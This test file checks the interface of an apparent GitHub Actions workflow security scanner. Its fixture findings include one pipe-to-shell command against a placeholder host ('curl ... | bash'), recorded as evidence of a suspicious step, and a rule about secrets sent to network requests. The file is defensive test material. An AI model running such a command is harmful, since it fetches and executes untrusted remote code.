import { fireEvent, render, screen } from '@testing-library/react';
import { describe, expect, it, vi } from 'vitest';
import { GithubActionsView } from './GithubActionsView';
import type { WorkflowScanResponse } from '../../../types/workflow';

const report: WorkflowScanResponse = {
  workflows: [
    {
      path: '/workspace/.github/workflows/secure.yml',
      name: 'Secure build',
      analysisStatus: 'analyzed',
      jobs: [{ id: 'build', name: 'Build', stepCount: 3 }],
    },
  ],
  findings: [
    {
      workflowPath: '/workspace/.github/workflows/secure.yml',
      jobId: 'build',
      stepIndex: 1,
      stepName: 'Download tool',
      ruleId: 'remote-script-pipe',
      category: 'suspiciousCommand',
      riskLevel: 'High',
      evidence: 'curl https://example.test/tool.sh | bash',
      reason: 'A remote script is piped to a shell.',
    },
    {
      workflowPath: '/workspace/.github/workflows/secure.yml',
      jobId: 'build',
      ruleId: 'workflow-broad-write-permissions',
      category: 'tokenPermissions',
      riskLevel: 'High',
      evidence: 'contents: write, pull-requests: write',
      reason: 'The workflow grants write access to multiple token scopes.',
    },
    {
      workflowPath: '/workspace/.github/workflows/secure.yml',
      jobId: 'build',
      stepIndex: 2,
      stepName: 'Upload token',
      ruleId: 'workflow-direct-secret-exposure',
      category: 'secretExposure',
      riskLevel: 'High',
      evidence: 'supported networkRequest sink',
      reason: 'A secret reference is passed directly to a supported network request sink.',
      secretReference: 'DEPLOY_TOKEN',
      exposureSink: 'networkRequest',
    },
  ],
  notices: [
    {
      workflowPath: '/workspace/.github/workflows/secure.yml',
      jobId: 'build',
      reason: 'An indirect secret flow is unresolved.',
    },
  ],
};

describe('GithubActionsView', () => {
  it('requires an explicit scan and does not start one while rendering', () => {
    const onScan = vi.fn();

    render(
      <GithubActionsView
        root="/workspace"
        operation={{ status: 'idle', requestId: 0 }}
        canScan
        onScan={onScan}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Ready for an explicit scan' })).toBeInTheDocument();
    expect(onScan).not.toHaveBeenCalled();

    fireEvent.click(screen.getByRole('button', { name: 'Scan Workflows' }));
    expect(onScan).toHaveBeenCalledOnce();
  });

  it('renders workflow context, permission evidence, notices, and safe secret metadata', () => {
    render(
      <GithubActionsView
        root="/workspace"
        operation={{ status: 'partial', requestId: 1, data: report, warnings: ['partial'] }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByText('Secure build')).toBeInTheDocument();
    expect(screen.getAllByText('/workspace/.github/workflows/secure.yml').length).toBeGreaterThan(0);
    expect(screen.getByText('remote-script-pipe')).toBeInTheDocument();
    expect(screen.getByText('contents: write, pull-requests: write')).toBeInTheDocument();
    expect(screen.getByText('DEPLOY_TOKEN')).toBeInTheDocument();
    expect(screen.getByText('network request')).toBeInTheDocument();
    expect(screen.getByText(/indirect secret flow is unresolved/)).toBeInTheDocument();
    expect(screen.queryByText('${{ secrets.DEPLOY_TOKEN }}')).not.toBeInTheDocument();
  });

  it('keeps no-workflow and inspection-failure states distinct from clean results', () => {
    const { rerender } = render(
      <GithubActionsView
        root="/workspace"
        operation={{ status: 'success', requestId: 1, data: { workflows: [], findings: [], notices: [] } }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByRole('heading', { name: 'No workflow files found' })).toBeInTheDocument();
    expect(screen.queryByText('No supported findings')).not.toBeInTheDocument();

    rerender(
      <GithubActionsView
        root="/workspace"
        operation={{ status: 'error', requestId: 2, error: 'security.yml: malformed YAML' }}
        canScan
        onScan={vi.fn()}
      />,
    );

    expect(screen.getByRole('heading', { name: 'Workflow inspection failed' })).toBeInTheDocument();
    expect(screen.getByText('security.yml: malformed YAML')).toBeInTheDocument();
  });
});
